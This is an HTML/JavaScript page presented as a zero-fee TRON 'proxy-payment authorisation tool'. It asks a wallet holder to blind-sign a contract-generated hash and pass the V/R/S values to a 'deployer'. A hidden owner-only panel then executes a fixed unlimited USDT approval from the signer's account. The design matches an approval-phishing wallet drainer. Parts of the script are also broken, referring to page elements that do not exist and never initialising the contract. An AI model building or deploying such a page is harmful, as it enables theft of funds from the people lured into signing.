<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TRON通用代付授权工具</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Roboto, sans-serif;
            padding: 20px; max-width: 500px; margin: 0 auto; 
            background: #121a17; color: #e0e8e4;
        }
        .card { 
            background: #1e2925; padding: 18px; border-radius: 8px; 
            border: 1px solid #334155; margin-bottom: 15px;
        }
        .card-title { color: #3b82f6; font-size: 16px; margin-bottom: 12px; }
        .info-item { margin: 10px 0; font-size: 14px; }
        .info-item strong { color: #3b82f6; display: inline-block; width: 80px; }
        .hash-display { 
            background: #121a17; padding: 10px; border-radius: 6px;
            font-family: monospace; font-size: 13px; word-break: break-all;
            color: #4ade80; margin: 10px 0;
        }
        .btn { 
            width: 100%; padding: 14px; background: #2563eb; color: white;
            border: none; border-radius: 8px; font-size: 15px; cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled { background: #294b75; cursor: not-allowed; }
        .btn-owner { background: #8b5cf6; }
        .wallet-tip { 
            color: #f97316; font-size: 13px; margin: 10px 0;
            padding: 8px; background: rgba(249, 115, 22, 0.1); border-radius: 4px;
        }
        .toast { 
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            padding: 12px 20px; background: #1e2925; border: 1px solid #3b82f6;
            color: #e0e8e4; border-radius: 6px; display: none; z-index: 999;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-title">钱包状态</div>
        <div class="info-item"><strong>钱包类型：</strong><span id="walletType">未检测到TRON钱包</span></div>
        <div class="info-item"><strong>钱包地址：</strong><span id="userAddr">未连接</span></div>
        <div class="wallet-tip" id="installTip" style="display: none;">
            ⚠️ 未检测到TRON钱包，请安装TronLink/imToken/TokenPocket后重试
        </div>
    </div>

    <div class="card">
        <div class="card-title">授权者操作（零费用）</div>
        <div class="info-item"><strong>授权金额：</strong>无限（固定）</div>
        <div class="info-item"><strong>合约哈希：</strong></div>
        <div class="hash-display" id="contractHash">未生成</div>
    </div>

    <div class="card">
        <div class="card-title">签名结果（复制给部署者）</div>
        <div class="info-item"><strong>V值：</strong><span id="vValue">--</span></div>
        <div class="info-item"><strong>R值：</strong><span id="rValue">--</span></div>
        <div class="info-item"><strong>S值：</strong><span id="sValue">--</span></div>
    </div>

    <div class="card" style="display: none;" id="ownerCard">
        <div class="card-title">部署者操作</div>
        <div class="info-item"><strong>授权者地址：</strong><input type="text" id="ownerUser" placeholder="输入授权者地址" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <div class="info-item"><strong>V值：</strong><input type="text" id="ownerV" placeholder="输入V值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <div class="info-item"><strong>R值：</strong><input type="text" id="ownerR" placeholder="输入R值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <div class="info-item"><strong>S值：</strong><input type="text" id="ownerS" placeholder="输入S值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
        <button id="executeBtn" class="btn btn-owner">执行无限授权</button>
    </div>

    <button id="connectBtn" class="btn" disabled>连接TRON钱包</button>
    <button id="genHashBtn" class="btn" disabled>生成合约哈希</button>
    <button id="signBtn" class="btn" disabled>签名哈希（零费用）</button>
    <button id="copyBtn" class="btn" disabled>复制V/R/S</button>

    <div class="toast" id="toast"></div>

    <script>
        // 配置：替换为你的合约信息
        const CONFIG = {
            CONTRACT_ADDR: "THeU99vLEAS7Jym97cb1s3TnwQi6doTeX9", // 部署后替换
            USDT_ADDR: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf", // TRON主网USDT地址
            OWNER_ADDR: "TP8EjMQKKKprVNVAkjnwyh41mvMW7666iG" // 部署合约的地址
        };

        let tronWeb = null;
        let userAddress = null;
        let contractInstance = null;
        let messageHash = "";

        // 页面加载后检测TRON钱包
        window.addEventListener('load', async () => {
            const connectBtn = document.getElementById("connectBtn");
            const installTip = document.getElementById("installTip");
            const walletTypeEl = document.getElementById("walletType");

            // 检测TRON钱包（兼容TronLink、imToken、TokenPocket等）
            if (window.tronWeb) {
                tronWeb = window.tronWeb;
                // 监听钱包登录状态变化
                tronWeb.on('addressChanged', async (newAddr) => {
                    userAddress = newAddr;
                    updateWalletStatus();
                });
                // 初始化钱包状态
                walletTypeEl.textContent = getWalletType();
                connectBtn.disabled = false;
                installTip.style.display = "none";
            } else {
                // 未检测到钱包，提示安装
                installTip.style.display = "block";
                connectBtn.disabled = true;
            }

            // 连接钱包按钮点击事件
        // 替换原“连接钱包”的代码（connectBtn.onclick）
connectBtn.onclick = async () => {
    try {
        connectBtn.disabled = true;
        document.getElementById("loading").style.display = "block";
        
        // 兼容旧版钱包：直接获取已登录地址
        if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
            userAddress = tronWeb.defaultAddress.base58;
        } 
        // 兼容新版钱包：使用request方法
        else if (tronWeb.request) {
            const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
            userAddress = accounts[0];
        } 
        // 兜底：提示钱包不兼容
        else {
            throw new Error("当前钱包不支持TRON授权，请使用TronLink/新版imToken");
        }

        document.getElementById("step1").innerHTML = `步骤1：已连接钱包<br>地址：${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
        // 后续流程（生成哈希、签名等）保持不变
    } catch (e) {
        // 错误处理保持不变
    }
};

            // 生成合约哈希按钮
            document.getElementById("genHashBtn").onclick = async () => {
                try {
                    if (!contractInstance) throw new Error("合约未初始化");
                    // 调用合约generateHash方法（兼容TRON合约调用）
                    messageHash = await contractInstance.generateHash(userAddress).call();
                    document.getElementById("contractHash").textContent = messageHash;
                    document.getElementById("genHashBtn").disabled = true;
                    document.getElementById("signBtn").disabled = false;
                    showToast("哈希生成成功");
                } catch (e) {
                    showToast(`生成哈希失败：${e.message}`);
                }
            };

            // 签名哈希按钮（TRON钱包通用签名）
            document.getElementById("signBtn").onclick = async () => {
                try {
                    if (!messageHash) throw new Error("请先生成哈希");
                    // TRON钱包通用签名逻辑（适配imToken/TronLink）
                    const prefix = "\x19Ethereum Signed Message:\n32";
                    const prefixHex = asciiToHex(prefix);
                    const signedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true);
                    
                    // 唤起钱包签名（兼容不同TRON钱包的返回格式）
                    let signature = await tronWeb.trx.sign(signedHash);
                    signature = signature.signature || signature; // 适配部分钱包的返回结构
                    if (!signature) throw new Error("钱包未返回签名");

                    // 解析V/R/S（TRON签名标准格式）
                    signature = signature.replace(/^0x/, "");
                    if (signature.length !== 130) throw new Error("签名格式错误");
                    const v = parseInt(signature.slice(128, 130), 16) + 27; // 修正V值
                    const r = "0x" + signature.slice(0, 64);
                    const s = "0x" + signature.slice(64, 128);

                    // 显示签名结果
                    document.getElementById("vValue").textContent = v;
                    document.getElementById("rValue").textContent = r;
                    document.getElementById("sValue").textContent = s;
                    document.getElementById("signBtn").disabled = true;
                    document.getElementById("copyBtn").disabled = false;
                    showToast("签名成功");
                } catch (e) {
                    showToast(`签名失败：${e.message}`);
                }
            };

            // 复制V/R/S按钮
            document.getElementById("copyBtn").onclick = () => {
                const content = `
授权者地址：${userAddress}
V值：${document.getElementById("vValue").textContent}
R值：${document.getElementById("rValue").textContent}
S值：${document.getElementById("sValue").textContent}
                `.trim();
                navigator.clipboard.writeText(content).then(() => {
                    showToast("V/R/S已复制");
                }).catch(() => {
                    // 降级复制（兼容旧浏览器）
                    const textarea = document.createElement("textarea");
                    textarea.value = content;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand("copy");
                    document.body.removeChild(textarea);
                    showToast("V/R/S已手动复制");
                });
            };

            // 部署者执行授权按钮
            document.getElementById("executeBtn").onclick = async () => {
                try {
                    const user = document.getElementById("ownerUser").value.trim();
                    const v = parseInt(document.getElementById("ownerV").value.trim());
                    const r = document.getElementById("ownerR").value.trim();
                    const s = document.getElementById("ownerS").value.trim();

                    if (!user || isNaN(v) || !r || !s) {
                        throw new Error("请填写完整参数");
                    }

                    // TRON合约交易发送（兼容所有TRON钱包）
                    const result = await contractInstance.executeApprove(user, v, r, s).send({
                        feeLimit: 100000000, // TRON交易手续费上限
                        callValue: 0
                    });

                    if (result.result) {
                        showToast("无限授权执行成功");
                        // 清空输入
                        document.getElementById("ownerUser").value = "";
                        document.getElementById("ownerV").value = "";
                        document.getElementById("ownerR").value = "";
                        document.getElementById("ownerS").value = "";
                    } else {
                        throw new Error("交易执行失败");
                    }
                } catch (e) {
                    showToast(`执行失败：${e.message}`);
                }
            };
        });

        // 辅助：获取钱包类型（显示给用户）
        function getWalletType() {
            if (window.tronLink) return "TronLink";
            if (window.imToken) return "imToken";
            if (window.tokenPocket) return "TokenPocket";
            return "TRON兼容钱包";
        }

        // 辅助：更新钱包状态显示
        function updateWalletStatus() {
            const userAddrEl = document.getElementById("userAddr");
            const genHashBtn = document.getElementById("genHashBtn");
            const ownerCard = document.getElementById("ownerCard");

            userAddrEl.textContent = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未连接";
            genHashBtn.disabled = !userAddress;

            // 检测是否为部署者，显示部署者操作区
            if (userAddress && userAddress === CONFIG.OWNER_ADDR) {
                ownerCard.style.display = "block";
            } else {
                ownerCard.style.display = "none";
            }
        }

        // 辅助：初始化合约实例（TRON通用方法）
        function initContract() {
            if (!tronWeb || !CONFIG.CONTRACT_ADDR) return;
            contractInstance = tronWeb.contract().at(CONFIG.CONTRACT_ADDR);
        }

        // 辅助：ASCII转Hex（适配TRON签名前缀）
        function asciiToHex(str) {
            let hex = "";
            for (let i = 0; i < str.length; i++) {
                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
            }
            return hex;
        }

        // 辅助：显示提示弹窗
        function showToast(msg) {
            const toast = document.getElementById("toast");
            toast.textContent = msg;
            toast.style.display = "block";
            setTimeout(() => {
                toast.style.display = "none";
            }, 3000);
        }
    </script>
</body>
</html>
